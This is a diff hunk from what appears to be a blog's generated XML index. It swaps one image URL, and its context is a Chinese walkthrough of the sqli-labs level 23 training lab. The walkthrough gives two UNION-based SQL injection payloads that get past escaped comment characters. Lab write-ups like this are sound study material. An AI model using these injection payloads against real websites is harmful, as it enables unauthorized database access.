@@ -82,7 +82,7 @@
   <entry>
     <title>sql-lab 23-27</title>
     <url>//sql-lab23%E5%90%AF/</url>
-    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/ec93431c08b244439a047601c39c2d32.png" alt="在这里插入图片描述"><br>人生海海，又何必在意一时浮沉。</p>
+    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/0ee074803bc6439b9893ec97f07efeb4.png" alt="在这里插入图片描述"><br>人生海海，又何必在意一时浮沉。</p>
 <span id="more"></span>
 <h1><span id="sql-lab-23">sql-lab 23</span></h1><p>源码如下图所示<br><img src="https://img-blog.csdnimg.cn/f1430cd11f294e40b8d4cab1d63677b6.png" alt="在这里插入图片描述"><br>如图可见注释符被转义了，因此在这一关无法使用注释符来执行sql注入，猜解出包裹方式为’后，我们可以利用’来作为注释符，<br>此时写payload可以使用两种</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span>或</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
